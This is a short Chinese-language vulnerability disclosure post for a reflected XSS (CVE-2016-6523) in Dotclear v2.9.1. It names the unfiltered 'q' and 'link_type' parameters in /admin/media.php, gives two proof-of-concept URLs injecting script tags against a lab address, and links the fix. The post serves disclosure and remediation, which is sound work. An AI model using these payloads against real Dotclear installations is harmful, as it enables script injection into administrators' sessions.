---
layout: post
title: Dotclear v2.9.1反射型xss [CVE-2016-6523]
---

发现者: 陈瑞琦 

发现日期: 2016-08-01

下载地址: [dotclear](https://dotclear.org/download)

作者: dotclear.org

作者通知日期: 2016-08-01

作者联系手段: security@dotclear.net

CVE ID: CVE-2016-6523

**描述:** 

Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)

*渣翻*

Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。


**细节:**

Dotclear v2.9.1 有一个反射型xss

/admin/media.php

line 34 $link_type = !empty($_REQUEST['link_type']) ? $_REQUEST['link_type'] : null;

line 62 $q = isset($_REQUEST['q']) ? $_REQUEST['q'] : null;

link_type 跟 q 参数缺少安全过滤

**PoC:**

http://172.16.146.130/dotclear/admin/media.php?q=77777%3C%2Fspan%3E%3Cscript%3Ealert(1)%3C/script%3E&popup=0&select=0&plugin_id=&post_id=&link_type=

http://172.16.146.130/dotclear/admin/media.php?q=77777&popup=0&select=0&plugin_id=&post_id=&link_type=8888%22%3E%3Cscript%3Ealert(1)%3C/script%3E

**修复方案:**

https://hg.dotclear.org/dotclear/rev/40d0207e520d
·